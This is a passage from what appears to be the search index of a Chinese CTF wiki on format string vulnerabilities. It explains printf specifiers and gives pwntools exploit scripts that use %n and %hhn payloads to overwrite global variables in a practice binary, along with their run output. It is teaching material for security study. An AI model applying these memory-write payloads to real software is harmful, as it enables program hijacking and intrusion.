\u3002\u8fd9\u91cc\u4ee52\u4e3a\u4f8b\u3002\u53ef\u80fd\u4f1a\u89c9\u5f97\u8fd9\u5176\u5b9e\u6ca1\u6709\u4ec0\u4e48\u533a\u522b\uff0c\u53ef\u4ed4\u7ec6\u4e00\u60f3\uff0c\u771f\u7684\u6ca1\u6709\u4e48\uff1f\u5982\u679c\u6211\u4eec\u8fd8\u662f\u5c06\u8981\u8986\u76d6\u7684\u5730\u5740\u653e\u5728\u6700\u524d\u9762\uff0c\u90a3\u4e48\u5c06\u76f4\u63a5\u5360\u7528\u673a\u5668\u5b57\u957f\u4e2a(4\u62168)\u5b57\u8282\u3002\u663e\u7136\uff0c\u65e0\u8bba\u4e4b\u540e\u5982\u4f55\u8f93\u51fa\uff0c\u90fd\u53ea\u4f1a\u6bd44\u5927\u3002 \u6216\u8bb8\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6574\u5f62\u6ea2\u51fa\u6765\u4fee\u6539\u5bf9\u5e94\u7684\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u8fd9\u6837\u5c06\u9762\u4e34\u7740\u6211\u4eec\u5f97\u4e00\u6b21\u8f93\u51fa\u5927\u91cf\u7684\u5185\u5bb9\u3002\u800c\u8fd9\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u57fa\u672c\u90fd\u4e0d\u4f1a\u653b\u51fb\u6210\u529f\u3002 \u90a3\u4e48\u6211\u4eec\u5e94\u8be5\u600e\u4e48\u505a\u5462\uff1f\u518d\u4ed4\u7ec6\u60f3\u4e00\u4e0b\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u5c06\u6240\u8981\u8986\u76d6\u7684\u53d8\u91cf\u7684\u5730\u5740\u653e\u5728\u5b57\u7b26\u4e32\u7684\u6700\u524d\u9762\u4e48\uff1f\u4f3c\u4e4e\u6ca1\u6709\uff0c\u6211\u4eec\u5f53\u65f6\u53ea\u662f\u4e3a\u4e86\u5bfb\u627e\u504f\u79fb\uff0c\u6240\u4ee5\u624d\u628atag\u653e\u5728\u5b57\u7b26\u4e32\u7684\u6700\u524d\u9762\uff0c\u5982\u679c\u6211\u4eec\u628atag\u653e\u5728\u4e2d\u95f4\uff0c\u5176\u5b9e\u4e5f\u662f\u65e0\u59a8\u7684\u3002\u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u628a\u5730\u5740\u653e\u5728\u4e2d\u95f4\uff0c\u53ea\u8981\u80fd\u591f\u627e\u5230\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u5176\u7167\u6837\u4e5f\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u6570\u503c\u3002\u524d\u9762\u5df2\u7ecf\u8bf4\u4e86\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4e3a\u7b2c6\u4e2a\u53c2\u6570\u3002\u7531\u4e8e\u6211\u4eec\u60f3\u8981\u628a2\u5199\u5230\u5bf9\u5e94\u7684\u5730\u5740\u5904\uff0c\u6545\u800c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u524d\u9762\u7684\u5b57\u8282\u5fc5\u987b\u662f aa%k$nxx \u6b64\u65f6\u5bf9\u5e94\u7684\u5b58\u50a8\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5df2\u7ecf\u5360\u636e\u4e866\u4e2a\u5b57\u7b26\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u6211\u4eec\u518d\u6dfb\u52a0\u4e24\u4e2a\u5b57\u7b26aa\uff0c\u90a3\u4e48\u5176\u5b9eaa%k\u5c31\u662f\u7b2c6\u4e2a\u53c2\u6570\uff0c$nxx\u5176\u5b9e\u5c31\u662f\u7b2c7\u4e2a\u53c2\u6570\uff0c\u540e\u9762\u6211\u4eec\u5982\u679c\u8ddf\u4e0a\u6211\u4eec\u8981\u8986\u76d6\u7684\u5730\u5740\uff0c\u90a3\u5c31\u662f\u7b2c8\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u8fd9\u91cc\u8bbe\u7f6ek\u4e3a8\uff0c\u5176\u5b9e\u5c31\u53ef\u4ee5\u8986\u76d6\u4e86\u3002 \u5229\u7528ida\u53ef\u4ee5\u5f97\u5230a\u7684\u5730\u5740\u4e3a0x0804A024\uff08\u7531\u4e8ea\u3001b\u662f\u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u56e0\u6b64\u4e0d\u5728\u5806\u6808\u4e2d\uff09\u3002 .data: 0804 A024 public a .data: 0804 A024 a dd 7 Bh \u6545\u800c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684\u5229\u7528\u4ee3\u7801 def fora (): sh = process ( './overwrite' ) a_addr = 0x0804A024 payload = 'aa%8$naa' + p32 ( a_addr ) sh . sendline ( payload ) print sh . recv () sh . interactive () \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b \u279c overwrite git: ( master ) \u2717 python exploit.py [ + ] Starting local process './overwrite' : pid 76508 [ * ] Process './overwrite' stopped with exit code 0 ( pid 76508 ) 0xffc1729c aaaa$ \\x a0 \\x 0modified a for a small number. \u5176\u5b9e\uff0c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u638c\u63e1\u7684\u5c0f\u6280\u5de7\u5c31\u662f\uff0c\u6211\u4eec\u6ca1\u6709\u5fc5\u8981\u5fc5\u987b\u628a\u5730\u5740\u653e\u5728\u6700\u524d\u9762\uff0c\u653e\u5728\u90a3\u91cc\u90fd\u53ef\u4ee5\uff0c\u53ea\u8981\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u5176\u5bf9\u5e94\u7684\u504f\u79fb\u5373\u53ef\u3002","title":"\u8986\u76d6\u5c0f\u6570\u5b57"},{"location":"pwn/fmtstr/fmtstr_exploit/#_15","text":"\u4e0a\u9762\u4ecb\u7ecd\u4e86\u8986\u76d6\u5c0f\u6570\u5b57\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u5c11\u8986\u76d6\u5927\u6570\u5b57\u4e86\u3002\u4e0a\u9762\u6211\u4eec\u4e5f\u8bf4\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u76f4\u63a5\u4e00\u6b21\u6027\u8f93\u51fa\u5927\u6570\u5b57\u4e2a\u5b57\u8282\u6765\u8fdb\u884c\u8986\u76d6\uff0c\u4f46\u662f\u8fd9\u6837\u57fa\u672c\u4e5f\u4e0d\u4f1a\u6210\u529f\uff0c\u56e0\u4e3a\u592a\u957f\u4e86\u3002\u800c\u4e14\u5373\u4f7f\u6210\u529f\uff0c\u6211\u4eec\u4e00\u6b21\u6027\u7b49\u5f85\u7684\u65f6\u95f4\u4e5f\u592a\u957f\u4e86\uff0c\u90a3\u4e48\u6709\u6ca1\u6709\u4ec0\u4e48\u6bd4\u8f83\u597d\u7684\u65b9\u5f0f\u5462\uff1f\u81ea\u7136\u662f\u6709\u4e86\u3002 \u4e0d\u8fc7\u5728\u4ecb\u7ecd\u4e4b\u524d\uff0c\u6211\u4eec\u5f97\u5148\u518d\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\uff0c\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u7684\u5b58\u50a8\u683c\u5f0f\u3002\u9996\u5148\uff0c\u6240\u6709\u7684\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u90fd\u662f\u4ee5\u5b57\u8282\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6b64\u5916\uff0c\u5728x86\u548cx64\u7684\u4f53\u7cfb\u7ed3\u6784\u4e2d\uff0c\u53d8\u91cf\u7684\u5b58\u50a8\u683c\u5f0f\u4e3a\u4ee5\u5c0f\u7aef\u5b58\u50a8\uff0c\u5373\u6700\u4f4e\u6709\u6548\u4f4d\u5b58\u50a8\u5728\u4f4e\u5730\u5740\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff0c0x12345678\u5728\u5185\u5b58\u4e2d\u7531\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\u4f9d\u6b21\u4e3a\\x78\\x56\\x34\\x12\u3002\u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u56de\u5fc6\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u6807\u5fd7\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u8fd9\u4e48\u4e24\u4e2a\u6807\u5fd7\uff1a hh \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0cprintf\u671f\u5f85\u4e00\u4e2a\u4ecechar\u63d0\u5347\u7684int\u5c3a\u5bf8\u7684\u6574\u578b\u53c2\u6570\u3002 h \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0cprintf\u671f\u5f85\u4e00\u4e2a\u4eceshort\u63d0\u5347\u7684int\u5c3a\u5bf8\u7684\u6574\u578b\u53c2\u6570\u3002 \u6240\u4ee5\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528%hhn\u5411\u67d0\u4e2a\u5730\u5740\u5199\u5165\u5355\u5b57\u8282\uff0c\u5229\u7528%hn\u5411\u67d0\u4e2a\u5730\u5740\u5199\u5165\u53cc\u5b57\u8282\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5\u5355\u5b57\u8282\u4e3a\u4f8b\u3002 \u9996\u5148\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u786e\u5b9a\u7684\u662f\u8981\u8986\u76d6\u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u5229\u7528ida\u770b\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u5730\u5740\u4e3a0x0804A028\u3002 .data:0804A028 public b .data:0804A028 b dd 1C8h ; DATA XREF: main:loc_8048510\u0018r \u5373\u6211\u4eec\u5e0c\u671b\u5c06\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u8fdb\u884c\u8986\u76d6\uff0c\u524d\u9762\u4e3a\u8986\u76d6\u5730\u5740\uff0c\u540e\u9762\u4e3a\u8986\u76d6\u5185\u5bb9\u3002 0x0804A028 \\x78 0x0804A029 \\x56 0x0804A02a \\x34 0x0804A02b \\x12 \u9996\u5148\uff0c\u7531\u4e8e\u6211\u4eec\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u7684payload\u57fa\u672c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684 p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$n'+pad2+'%7$n'+pad3+'%8$n'+pad4+'%9$n' \u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u8fdb\u884c\u8ba1\u7b97\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u57fa\u672c\u7684\u6784\u9020\uff0c\u5982\u4e0b def fmt ( prev , word , index ): if prev < word : result = word - prev fmtstr = \"%\" + str ( result ) + \"c\" elif prev == word : result = 0 else : result = 256 + word - prev fmtstr = \"%\" + str ( result ) + \"c\" fmtstr += \"%\" + str ( index ) + \"$hhn\" return fmtstr def fmt_str ( offset , size , addr , target ): payload = \"\" for i in range ( 4 ): if size == 4 : payload += p32 ( addr + i ) else : payload += p64 ( addr + i ) prev = len ( payload ) for i in range ( 4 ): payload += fmt ( prev , ( target >> i * 8 ) & 0xff , offset + i ) prev = ( target >> i * 8 ) & 0xff return payload payload = fmt_str ( 6 , 4 , 0x0804A028 , 0x12345678 ) \u5176\u4e2d\u6bcf\u4e2a\u53c2\u6570\u7684\u542b\u4e49\u57fa\u672c\u5982\u4e0b offset\u8868\u793a\u8981\u8986\u76d6\u7684\u5730\u5740\u6700\u521d\u7684\u504f\u79fb size\u8868\u793a\u673a\u5668\u5b57\u957f addr\u8868\u793a\u5c06\u8981\u8986\u76d6\u7684\u5730\u5740\u3002 target\u8868\u793a\u6211\u4eec\u8981\u8986\u76d6\u4e3a\u7684\u76ee\u7684\u53d8\u91cf\u503c\u3002 \u76f8\u5e94\u7684exploit\u5982\u4e0b def forb (): sh = process ( './overwrite' ) payload = fmt_str ( 6 , 4 , 0x0804A028 , 0x12345678 ) print payload sh . sendline ( payload ) print sh . recv () sh . interactive () \u7ed3\u679c\u5982\u4e0b \u279c overwrite git :( master ) \u2717 python exploit . py [ + ] Starting local process './overwrite' : pid 78547 ( \\ xa0 \\ x0 ) \\ xa0 \\ x0 * \\ xa0 \\ x0 + \\ xa0 \\ x0 % 104 c % 6 $ hhn % 222 c % 7 $ hhn % 222 c % 8 $ hhn % 222 c % 9 $ hhn [ * ] Process './overwrite' stopped with exit code 0 ( pid 78547 ) 0xfff6f9bc ( \\ xa0 \\ x0 ) \\ xa0 \\ x0 * \\ xa0 \\ x0 + \\ xa0 \\ x0 X \ufffd \\ xbb ~ modified b for a big number ! \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528%n\u5206\u522b\u5bf9\u6bcf\u4e2a\u5730\u5740\u8fdb\u884c\u5199\u5165\uff0c\u4e5f\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u7b54\u6848\uff0c\u4f46\u662f\u7531\u4e8e\u6211\u4eec\u5199\u5165\u7684\u53d8\u91cf\u90fd\u53ea\u4f1a\u5f71\u54cd\u7531\u5176\u5f00\u59cb\u7684\u56db\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6700\u540e\u4e00\u4e2a\u53d8\u91cf\u5199\u5b8c\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u4fee\u6539\u4e4b\u540e\u7684\u4e09\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u8fd9\u4e09\u4e2a\u5b57\u8282\u6bd4\u8f83\u91cd\u8981\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u6709\u53ef\u80fd\u56e0\u6b64\u5d29\u6e83\u3002\u800c\u91c7\u7528%hhn\u5219\u4e0d\u4f1a\u6709\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ea\u4f1a\u4fee\u6539\u76f8\u5e94\u5730\u5740\u7684\u4e00\u4e2a\u5b57\u8282\u3002","title":"\u8986\u76d6\u5927\u6570\u5b57"},{"location":"pwn/fmtstr/fmtstr_intro/","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406\u4ecb\u7ecd \u00b6 \u9996\u5148\uff0c\u5bf9\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u539f\u7406\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4ecb\u7ecd \u00b6 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\uff0c\u5e76\u5c06 \u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u6839\u636e\u5176\u6765\u89e3\u6790\u4e4b\u540e\u7684\u53c2\u6570 \u3002\u901a\u4fd7\u6765\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u5c31\u662f\u5c06\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\u8868\u793a\u7684\u6570\u636e\u8f6c\u5316\u4e3a\u6211\u4eec\u4eba\u7c7b\u53ef\u8bfb\u7684\u5b57\u7b26\u4e32\u683c\u5f0f\u3002\u51e0\u4e4e\u6240\u6709\u7684C/C++\u7a0b\u5e8f\u90fd\u4f1a\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6765 \u8f93\u51fa\u4fe1\u606f\uff0c\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u6216\u8005\u5904\u7406\u5b57\u7b26\u4e32 \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u5229\u7528\u7684\u65f6\u5019\u4e3b\u8981\u5206\u4e3a\u4e09\u4e2a\u90e8\u5206 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \u540e\u7eed\u53c2\u6570\uff0c \u53ef\u9009 \u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5176\u5b9e\u76f8\u4fe1\u5927\u591a\u6570\u4eba\u90fd\u63a5\u89e6\u8fc7printf\u51fd\u6570\u4e4b\u7c7b\u7684\u3002\u4e4b\u540e\u6211\u4eec\u518d\u4e00\u4e2a\u4e00\u4e2a\u8fdb\u884c\u4ecb\u7ecd\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570 \u00b6 \u5e38\u89c1\u7684\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6709 \u8f93\u5165 scanf \u8f93\u51fa \u51fd\u6570 \u57fa\u672c\u4ecb\u7ecd printf \u8f93\u51fa\u5230stdout fprintf \u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41 vprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230 stdout vfprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41 sprintf \u8f93\u51fa\u5230\u5b57\u7b26\u4e32 snprintf \u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u6570\u5230\u5b57\u7b26\u4e32 vsprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u5b57\u7b26\u4e32 vsnprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u5230\u5b57\u7b26\u4e32 setproctitle \u8bbe\u7f6eargv syslog \u8f93\u51fa\u65e5\u5fd7 err, verr, warn, vwarn\u7b49 \u3002\u3002\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4e86\u89e3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u683c\u5f0f\uff0c\u5176\u57fa\u672c\u683c\u5f0f\u5982\u4e0b %[parameter][flags][field width][.precision][length]type \u6bcf\u4e00\u79cdpattern\u7684\u542b\u4e49\u8bf7\u5177\u4f53\u53c2\u8003\u7ef4\u57fa\u767e\u79d1\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \u3002\u4ee5\u4e0b\u51e0\u4e2apattern\u4e2d\u7684\u5bf9\u5e94\u9009\u62e9\u9700\u8981\u91cd\u70b9\u5173\u6ce8 parameter n$\uff0c\u83b7\u53d6\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u6307\u5b9a\u53c2\u6570 flag field width \u8f93\u51fa\u7684\u6700\u5c0f\u5bbd\u5ea6 precision \u8f93\u51fa\u7684\u6700\u5927\u957f\u5ea6 length\uff0c\u8f93\u51fa\u7684\u957f\u5ea6 hh\uff0c\u8f93\u51fa\u4e00\u4e2a\u5b57\u8282 h\uff0c\u8f93\u51fa\u4e00\u4e2a\u53cc\u5b57\u8282 \u200b type d/i\uff0c\u6709\u7b26\u53f7\u6574\u6570 u\uff0c\u65e0\u7b26\u53f7\u6574\u6570 x/X\uff0c16\u8fdb\u5236unsigned int \u3002x\u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff1bX\u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u88650\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a1\u3002\u7cbe\u5ea6\u4e3a0\u4e14\u503c\u4e3a0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a\u3002 o\uff0c8\u8fdb\u5236unsigned int \u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u88650\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a1\u3002\u7cbe\u5ea6\u4e3a0\u4e14\u503c\u4e3a0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a\u3002 s\uff0c\u5982\u679c\u6ca1\u6709\u7528l\u6807\u5fd7\uff0c\u8f93\u51fanull\u7ed3\u5c3e\u5b57\u7b26\u4e32\u76f4\u5230\u7cbe\u5ea6\u89c4\u5b9a\u7684\u4e0a\u9650\uff1b\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u6240\u6709\u5b57\u8282\u3002\u5982\u679c\u7528\u4e86l\u6807\u5fd7\uff0c\u5219\u5bf9\u5e94\u51fd\u6570\u53c2\u6570\u6307\u5411wchar_t\u578b\u7684\u6570\u7ec4\uff0c\u8f93\u51fa\u65f6\u628a\u6bcf\u4e2a\u5bbd\u5b57\u7b26\u8f6c\u5316\u4e3a\u591a\u5b57\u8282\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e\u8c03\u7528wcrtomb \u51fd\u6570\u3002 c\uff0c\u5982\u679c\u6ca1\u6709\u7528l\u6807\u5fd7\uff0c\u628aint\u53c2\u6570\u8f6c\u4e3aunsigned char\u578b\u8f93\u51fa\uff1b\u5982\u679c\u7528\u4e86l\u6807\u5fd7\uff0c\u628awint_t\u53c2\u6570\u8f6c\u4e3a\u5305\u542b\u4e24\u4e2a\u5143\u7d20\u7684wchart_t\u6570\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u5305\u542b\u8981\u8f93\u51fa\u7684\u5b57\u7b26\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4e3anull\u5bbd\u5b57\u7b26\u3002 p\uff0c void *\u578b\uff0c\u8f93\u51fa\u5bf9\u5e94\u53d8\u91cf\u7684\u503c\u3002printf(\"%p\",a)\u7528\u5730\u5740\u7684\u683c\u5f0f\u6253\u5370\u53d8\u91cfa\u7684\u503c\uff0cprintf(\"%p\", &a)\u6253\u5370\u53d8\u91cfa\u6240\u5728\u7684\u5730\u5740\u3002 n\uff0c\u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002 %\uff0c ' % '\u5b57\u9762\u503c\uff0c\u4e0d\u63a5\u53d7\u4efb\u4f55flags, width\u3002 \u53c2\u6570 \u00b6 \u5c31\u662f\u76f8\u5e94\u7684\u8981\u8f93\u51fa\u7684\u53d8\u91cf\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406 \u00b6 \u5728\u4e00\u5f00\u59cb\uff0c\u6211\u4eec\u5c31\u7ed9\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u57fa\u672c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u518d\u8bf4\u4e00\u4e9b\u6bd4\u8f83\u7ec6\u81f4\u7684\u5185\u5bb9\u3002\u6211\u4eec\u4e0a\u9762\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u662f\u6839\u636e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6765\u8fdb\u884c\u89e3\u6790\u7684\u3002 \u90a3\u4e48\u76f8\u5e94\u7684\u8981\u88ab\u89e3\u6790\u7684\u53c2\u6570\u7684\u4e2a\u6570\u4e5f\u81ea\u7136\u662f\u7531\u8fd9\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u63a7\u5236 \u3002\u6bd4\u5982\u8bf4'%s'\u8868\u660e\u6211\u4eec\u4f1a\u8f93\u51fa\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\u3002 \u6211\u4eec\u518d\u7ee7\u7eed\u4ee5\u4e0a\u9762\u7684\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd \u5bf9\u4e8e\u8fd9\u6837\u7684\u4f8b\u5b50\uff0c\u5728\u8fdb\u5165printf\u51fd\u6570\u7684\u4e4b\u524d(\u5373\u8fd8\u6ca1\u6709\u8c03\u7528printf)\uff0c\u6808\u4e0a\u7684\u5e03\u5c40\u7531\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u4f9d\u6b21\u5982\u4e0b some value 3.14 123456 addr of \"red\" addr of format string: Color %s... \u6ce8\uff1a\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe3.14\u4e0a\u9762\u7684\u503c\u4e3a\u67d0\u4e2a\u672a\u77e5\u7684\u503c\u3002 \u5728\u8fdb\u5165printf\u4e4b\u540e\uff0c\u51fd\u6570\u9996\u5148\u83b7\u53d6\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u4e00\u4e2a\u8bfb\u53d6\u5176\u5b57\u7b26\u4f1a\u9047\u5230\u4e24\u79cd\u60c5\u51b5 \u5f53\u524d\u5b57\u7b26\u4e0d\u662f%\uff0c\u76f4\u63a5\u8f93\u51fa\u5230\u76f8\u5e94\u6807\u51c6\u8f93\u51fa\u3002 \u5f53\u524d\u5b57\u7b26\u662f%\uff0c \u7ee7\u7eed\u8bfb\u53d6\u4e0b\u4e00\u4e2a\u5b57\u7b26 \u5982\u679c\u6ca1\u6709\u5b57\u7b26\uff0c\u62a5\u9519 \u5982\u679c\u4e0b\u4e00\u4e2a\u5b57\u7b26\u662f%,\u8f93\u51fa% \u5426\u5219\u6839\u636e\u76f8\u5e94\u7684\u5b57\u7b26\uff0c\u83b7\u53d6\u76f8\u5e94\u7684\u53c2\u6570\uff0c\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u5e76\u8f93\u51fa \u90a3\u4e48\u5047\u8bbe\uff0c\u6b64\u65f6\u6211\u4eec\u5728\u7f16\u5199\u7a0b\u5e8f\u65f6\u5019\uff0c\u5199\u6210\u4e86\u4e0b\u9762\u7684\u6837\u5b50 printf ( \"Color %s, Number %d, Float %4.2f\" ); \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u5e76\u6ca1\u6709\u63d0\u4f9b\u53c2\u6570\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4f1a\u5982\u4f55\u8fd0\u884c\u5462\uff1f\u7a0b\u5e8f\u7167\u6837\u4f1a\u8fd0\u884c\uff0c\u4f1a\u5c06\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u5740\u4e0a\u9762\u7684\u4e09\u4e2a\u53d8\u91cf\u5206\u522b\u89e3\u6790\u4e3a \u89e3\u6790\u5176\u5730\u5740\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32 \u89e3\u6790\u5176\u5185\u5bb9\u5bf9\u5e94\u7684\u6574\u5f62\u503c \u89e3\u6790\u5176\u5185\u5bb9\u5bf9\u5e94\u7684\u6d6e\u70b9\u503c \u5bf9\u4e8e2\uff0c3\u6765\u8bf4\u5012\u8fd8\u65e0\u59a8\uff0c\u4f46\u662f\u5bf9\u4e8e\u5bf9\u4e8e1\u6765\u8bf4\uff0c\u5982\u679c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4e0d\u53ef\u8bbf\u95ee\u5730\u5740\uff0c\u6bd4\u59820\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1a\u56e0\u6b64\u800c\u5d29\u6e83\u3002 \u8fd9\u57fa\u672c\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u57fa\u672c\u539f\u7406\u4e86\u3002 \u53c2\u8003\u9605\u8bfb \u00b6 https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406\u4ecb\u7ecd"},{"location":"pwn/fmtstr/fmtstr_intro/#_1","text":"\u9996\u5148\uff0c\u5bf9\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u539f\u7406\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406\u4ecb\u7ecd"},{"location":"pwn/fmtstr/fmtstr_intro/#_2","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\uff0c\u5e76\u5c06 